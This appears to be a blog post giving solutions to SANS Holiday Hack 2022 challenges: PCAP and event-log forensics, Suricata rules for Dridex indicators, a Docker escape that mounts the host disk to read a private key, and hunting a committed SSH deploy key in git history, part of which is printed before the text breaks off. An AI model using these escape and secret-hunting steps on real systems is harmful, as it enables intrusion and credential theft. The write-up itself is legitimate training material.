@@ -1,0 +1,411 @@
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>Some SANS Holiday Hack 2022 Solutions</title><link rel=stylesheet href=/css/hugo-octopress.css><link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.110.0"><meta name=twitter:card content="summary"><meta name=twitter:title content="Some SANS Holiday Hack 2022 Solutions"><meta name=twitter:description content="As is tradition, I started the SANS Holiday Hack and stopped midway. A very fun
+static analysis problem came along ;)
+Previous years' writeups:
+/categories/holiday-hack/."><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
+complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
+<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Jan 19, 2023
+- 12 minute read
+- <a href=https://parsiya.net/blog/2023-01-19-some-sans-holiday-hack-2022-solutions/#disqus_thread>Comments</a>
+- <a class=label href=https://parsiya.net/categories/writeup/>Writeup </a><a class=label href=https://parsiya.net/categories/holiday-hack/>Holiday Hack</a></p><h1 class=entry-title>Some SANS Holiday Hack 2022 Solutions</h1></header><div class=entry-content><nav id=TableOfContents><ul><li><a href=#recover-the-tolkien-ring>Recover the Tolkien Ring</a><ul><li><a href=#wireshark-practice>Wireshark Practice</a></li><li><a href=#windows-event-logs>Windows Event Logs</a></li><li><a href=#suricata-regatta>Suricata Regatta</a><ul><li><a href=#suricata-rule-1>Suricata Rule 1</a></li><li><a href=#suricata-rule-2>Suricata Rule 2</a></li><li><a href=#suricata-rule-3>Suricata Rule 3</a></li><li><a href=#suricata-rule-4>Suricata Rule 4</a></li></ul></li></ul></li><li><a href=#recover-the-elfen-ring>Recover the Elfen Ring</a><ul><li><a href=#clone-with-a-difference>Clone with a Difference</a></li><li><a href=#prison-escape>Prison Escape</a></li><li><a href=#jolly-cicd>Jolly CI/CD</a></li></ul></li><li><a href=#recover-the-web-ring>Recover the Web Ring</a><ul><li><a href=#naughty-ip>Naughty IP</a></li><li><a href=#credential-mining>Credential Mining</a></li><li><a href=#404-ftw>404 FTW</a></li><li><a href=#imds-xxe-and-other-abbreviations>IMDS, XXE, and Other Abbreviations</a></li><li><a href=#open-boria-mine-door>Open Boria Mine Door</a><ul><li><a href=#pin1>Pin1</a></li><li><a href=#pin2>Pin2</a></li><li><a href=#pin3>Pin3</a></li><li><a href=#pin4>Pin4</a></li></ul></li></ul></li></ul></nav><p>As is tradition, I started the SANS Holiday Hack and stopped midway. A very fun
+static analysis problem came along ;)</p><p>Previous years' writeups:
+<a href=/categories/holiday-hack/>/categories/holiday-hack/</a>.</p><h1 id=recover-the-tolkien-ring>Recover the Tolkien Ring
+<a class=header-link href=#recover-the-tolkien-ring><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><h2 id=wireshark-practice>Wireshark Practice
+<a class=header-link href=#wireshark-practice><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><ol><li>What kind of objects can be exported from this PCAP?<ol><li><code>HTTP</code>, we can already see the packets.</li></ol></li><li>What is the file name of the largest file we can export?<ol><li><code>app.php</code> is the largest with 808Kb.</li><li><code>File > Export Objects > HTTP</code>.</li></ol></li><li>What packet number starts that app.php file?<ol><li>Same place, <code>687</code>.</li></ol></li><li>What is the IP of the Apache server?<ol><li><code>192.185.57.242</code>.</li><li>We find the <code>app.php</code> file, and see <code>Server: Apache</code> in the response
+headers.</li></ol></li><li>What file is saved to the infected host?<ol><li><code>Ref_Sept24-2020.zip</code></li><li>Export <code>app.php</code> and look inside. In the last lines after some base64
+encoded data we can see <code>saveAs(blob1, 'Ref_Sept24-2020.zip');</code>.</li></ol></li><li>Attackers used bad TLS certificates in this traffic. Which countries were
+they registered to? Submit the names of the countries in alphabetical order
+separated by a commas (Ex: Norway, South Korea).<ol><li><code>Israel, South Sudan, United States</code>, country codes <code>IL, SS, US</code>.</li><li>Use the <code>ssl.handshake.type == 11</code> filter to only show certificates.
+We're only looking for certificates for attackers but I cannot find any
+certificates for the server IP address from before (<code>192.185.57.242</code>).
+Seems like all certificates must be mentioned.</li></ol></li><li>Is the host infected (Yes/No)?<ol><li><code>Yes</code>.</li></ol></li></ol><h2 id=windows-event-logs>Windows Event Logs
+<a class=header-link href=#windows-event-logs><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><ol><li>What month/day/year did the attack take place? For example, 09/05/2021.<ol><li><code>12/24/2022</code></li><li><code>grep -i "Get-ChildItem" powershell.evtx.log</code></li><li>There are a lot of access denied messages for this command. Seems like
+the attacker was searching for the file everywhere.</li></ol></li><li>An attacker got a secret from a file. What was the original file's name?<ol><li><code>recipe_updated.txt</code></li><li><code>grep -i "Get-Content" powershell.evtx.log</code></li><li>The attacker probably used <code>Get-Content</code> to read the file. Looking in the
+file names, we can see the above.</li></ol></li><li>The contents of the previous file were retrieved, changed, and stored to a
+variable by the attacker. This was done multiple times. Submit the last full
+PowerShell line that performed only these actions.<ol><li><code>$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'</code></li><li>From the previous grep's results.</li></ol></li><li>After storing the altered file contents into the variable, the attacker used
+the variable to run a separate command that wrote the modified data to a
+file. This was done multiple times. Submit the last full PowerShell line that
+performed only this action.<ol><li><code>$foo | Add-Content -Path 'Recipe'</code></li><li><code>grep -i "\$foo" ...</code> has the answer.<ol><li>Logs are in reverse so the answer is the first result.</li></ol></li><li><code>grep -i "out-file" ...</code> didn't return any valid results. None were from 24/12/2022.</li></ol></li><li>The attacker ran the previous command against a file multiple times. What is
+the name of this file?<ol><li><code>$foo | Add-Content -Path 'Recipe.txt'</code></li><li><code>grep -i "\$foo \| Add-Content" ...</code></li><li>We see multiple instances of <code>$foo | Add-Content -Path 'Recipe.txt'</code></li></ol></li><li>Were any files deleted? (Yes/No)<ol><li><code>Yes</code></li><li><code>grep -i "Remove-Item" ...</code> has multiple results.</li></ol></li><li>Was the original file (from question 2) deleted? (Yes/No)<ol><li>Answer is supposedly <code>No</code> but <code>recipe_updated.txt</code> was deleted.</li><li><code>grep -i "recipe_updated.txt" ...</code> returns</li></ol></li><li>What is the Event ID of the log that shows the actual command line used to
+delete the file?<ol><li><code>4104</code></li><li>Search for <code>del</code> in Event log using the Windows Event Log Viewer.</li></ol></li><li>Is the secret ingredient compromised (Yes/No)?<ol><li><code>Yes</code></li></ol></li><li>What is the secret ingredient?<ol><li><code>honey</code></li><li>We can see it in the commands we saw above, it was replaced with <code>fish oil</code>.</li></ol></li></ol><h2 id=suricata-regatta>Suricata Regatta
+<a class=header-link href=#suricata-regatta><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><h3 id=suricata-rule-1>Suricata Rule 1
+<a class=header-link href=#suricata-rule-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><ol><li>Catch DNS lookups for <code>adv.epostoday.uk</code>.</li><li>The alert message (msg) should read <code>Known bad DNS lookup, possible Dridex infection</code>.</li></ol><p>We can just modify one of the rules already in the file.</p><pre tabindex=0><code>alert dns $HOME_NET any -&gt; any any
+    (msg:&#34;Known bad DNS lookup, possible Dridex infection&#34;;
+    dns.query; content:&#34;adv.epostoday.uk&#34;; nocase; sid:11111;)
+</code></pre><h3 id=suricata-rule-2>Suricata Rule 2
+<a class=header-link href=#suricata-rule-2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><ol><li>Alert when the infected IP address <code>192.185.57.242</code> communicates with
+internal systems over HTTP.</li><li>The message (msg) should read
+<code>Investigate suspicious connections, possible Dridex infection</code>.</li></ol><pre tabindex=0><code>alert http $HOME_NET any &lt;&gt; 192.185.57.242 any
+    (msg:&#34;Investigate suspicious connections, possible Dridex infection&#34;; sid:22222;)
+</code></pre><h3 id=suricata-rule-3>Suricata Rule 3
+<a class=header-link href=#suricata-rule-3><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><ol><li>TLS certificates with a specific <code>CN</code>.</li><li>Alert on an SSL certificate for <code>heardbellith.Icanwepeh.nagoya</code>.</li><li>The message (msg) should read <code>Investigate bad certificates, possible Dridex infection</code>.</li></ol><pre tabindex=0><code>alert tls any any -&gt; $HOME_NET any
+    (msg:&#34;Investigate bad certificates, possible Dridex infection&#34;;
+    tls.cert_subject; content:&#34;CN=heardbellith.Icanwepeh.nagoya&#34;; sid:33333;)
+</code></pre><h3 id=suricata-rule-4>Suricata Rule 4
+<a class=header-link href=#suricata-rule-4><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><ol><li>One line from the JavaScript: <code>let byteCharacters = atob</code>.</li><li>Might be GZip compressed.</li><li>Alert on that HTTP data with message <code>Suspicious JavaScript function, possible Dridex infection</code>.</li></ol><p><code>http.response_body</code> automatically decompressed responses.</p><pre tabindex=0><code>alert http any any -&gt; $HOME_NET any
+    (msg:&#34;Suspicious JavaScript function, possible Dridex infectionn&#34;;
+    http.response_body; content:&#34;let byteCharacters = atob&#34;; sid:44444;)
+</code></pre><h1 id=recover-the-elfen-ring>Recover the Elfen Ring
+<a class=header-link href=#recover-the-elfen-ring><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><h2 id=clone-with-a-difference>Clone with a Difference
+<a class=header-link href=#clone-with-a-difference><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Answer is <code>maintainers</code>.</p><p><code>git clone https://haugfactory.com/asnowball/aws_scripts</code></p><p>Also an interesting file: <code>~/.ssh/id_rsa</code>.</p><h2 id=prison-escape>Prison Escape
+<a class=header-link href=#prison-escape><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>What hex string appears in the host file <code>/home/jailer/.ssh/jail.key.priv</code>?
+<code>082bb339ec19de4935867</code>.</p><p>Hint from <code>Bow Ninecandle</code></p><pre tabindex=0><code>Developers love to give ALL TeH PERMz so that things &#34;just work,&#34; but it can
+cause real problems.
+
+It&#39;s always smart to check for excessive user and container permissions.
+
+You never know! You might be able to interact with host processes or
+filesystems!
+</code></pre><p><a href=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation target=_blank rel="noreferrer noopener">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation</a></p><pre tabindex=0><code>$ grep Cap /proc/1/status
+CapInh: 0000000000000000
+CapPrm: 0000003fffffffff
+CapEff: 0000003fffffffff
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+# had to use it on my own machine
+$ capsh --decode=0000003fffffffff
+0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,
+cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,
+cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,
+cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,
+cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,
+cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,
+cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,
+cap_wake_alarm,cap_block_suspend,cap_audit_read
+</code></pre><pre tabindex=0><code># become root
+$ sudo -s
+
+$ fdisk -l
+fdisk -l
+Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
+2048 cylinders, 64 heads, 32 sectors/track
+Units: sectors of 1 * 512 = 512 bytes
+
+Disk /dev/vda doesn&#39;t contain a valid partition table
+
+# mount the host file system
+$ mount /dev/vda /mnt
+
+# read the secret file
+$ cat /mnt/home/jailer/.ssh/jail.key.priv
+# [removed]
+# become admin
+</code></pre><h2 id=jolly-cicd>Jolly CI/CD
+<a class=header-link href=#jolly-cicd><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Answer: <code>oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</code>.</p><p>Hint from Tinsel</p><pre tabindex=0><code>Great! Thanks so much for your help!
+
+Now that you&#39;ve helped me with this, I have time to tell you about the
+deployment tech I&#39;ve been working on!
+
+Continuous Integration/Continuous Deployment pipelines allow developers to
+iterate and innovate quickly.
+
+With this project, once I push a commit, a GitLab runner will automatically
+deploy the changes to production.
+
+WHOOPS! I didn’t mean to commit that to
+http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+
+Unfortunately, if attackers can get in that pipeline, they can make an awful
+mess of things!
+</code></pre><p>Clone it</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75># make a copy of the original</span>
+</span></span><span style=display:flex><span>$ cp -r wordpress.flag.net.internal/ original
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#586e75># $ cat .gitlab-ci.yml </span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>stages</span>:
+</span></span><span style=display:flex><span>  - deploy
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>deploy-job</span>:      
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>stage</span>: deploy 
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>environment</span>: production
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>script</span>:
+</span></span><span style=display:flex><span>    - rsync -e &#34;ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy&#34;\
+</span></span><span style=display:flex><span>        --chown=www-data:www-data -atv --delete --progress ./\
+</span></span><span style=display:flex><span>        root@wordpress.flag.net.internal:/var/www/html
+</span></span></code></pre></div><p>Seems like Tinsel messed up and committed a secret to the repo.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#586e75># See log messages</span>
+</span></span><span style=display:flex><span>$ git log -10
+</span></span><span style=display:flex><span>commit 37b5d575bf81878934adb937a4fff0d32a8da105
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Wed Oct <span style=color:#2aa198>26</span> 13:58:15 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    updated wp-config
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit a59cfe83522c9aeff80d49a0be2226f4799ed239
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Wed Oct <span style=color:#2aa198>26</span> 12:41:05 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    update gitlab.ci.yml
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit a968d32c0b58fd64744f8698cbdb60a97ec604ed
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Tue Oct <span style=color:#2aa198>25</span> 16:43:48 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#b58900>test</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit 7093aad279fc4b57f13884cf162f7d80f744eea5
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Tue Oct <span style=color:#2aa198>25</span> 15:08:14 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    add gitlab-ci
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit e2208e4bae4d41d939ef21885f13ea8286b24f05
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Tue Oct <span style=color:#2aa198>25</span> 13:43:53 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    big update
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Tue Oct <span style=color:#2aa198>25</span> 13:42:54 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    whoops
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit abdea0ebb21b156c01f7533cea3b895c26198c98
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Tue Oct <span style=color:#2aa198>25</span> 13:42:13 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    added assets
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
+</span></span><span style=display:flex><span>Author: knee-oh &lt;sporx@kringlecon.com&gt;
+</span></span><span style=display:flex><span>Date:   Mon Oct <span style=color:#2aa198>24</span> 17:32:07 <span style=color:#2aa198>2022</span> -0700
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    init commit
+</span></span></code></pre></div><p>Make a branch from that commit.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ git checkout -b assets abdea0ebb21b156c01f7533cea3b895c26198c98
+</span></span><span style=display:flex><span>Switched to a new branch <span style=color:#2aa198>&#39;assets&#39;</span>
+</span></span><span style=display:flex><span>grinchum-land:~/wordpress.flag.net.internal$ git status
+</span></span><span style=display:flex><span>On branch assets
+</span></span><span style=display:flex><span>nothing to commit, working tree clean
+</span></span><span style=display:flex><span>grinchum-land:~/wordpress.flag.net.internal$ ll
+</span></span><span style=display:flex><span>total <span style=color:#2aa198>48</span>
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#2aa198>8</span> samways users  <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> 21:59 .git
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#2aa198>5</span> samways users  <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> 21:59 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#2aa198>2</span> samways users  <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> 21:59 .ssh
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#2aa198>1</span> samways  <span style=color:#2aa198>1002</span>  <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> 21:58 ..
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#2aa198>6</span> samways users  <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> 21:56 wp-content
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#2aa198>1</span> samways users <span style=color:#2aa198>19915</span> Dec <span style=color:#2aa198>14</span> 21:56 license.txt
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#2aa198>1</span> samways users  <span style=color:#2aa198>7401</span> Dec <span style=color:#2aa198>14</span> 21:56 readme.html
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>grinchum-land:~/wordpress.flag.net.internal/$ ll .ssh/
+</span></span><span style=display:flex><span>total <span style=color:#2aa198>16</span>
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#2aa198>2</span> samways users <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> 21:59 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#2aa198>5</span> samways users <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> 21:59 ..
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#2aa198>1</span> samways users  <span style=color:#2aa198>411</span> Dec <span style=color:#2aa198>14</span> 21:59 .deploy
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#2aa198>1</span> samways users  <span style=color:#2aa198>102</span> Dec <span style=color:#2aa198>14</span> 21:59 .deploy.pub
+</span></span><span style=display:flex><span>grinchum-land:~/wordpress.flag.net.internal/.ssh$ cat .deploy
+</span></span><span style=display:flex><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style=display:flex><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+</span></span><span style=display:flex><span>QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+</span></span><span style=display:flex><span>9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
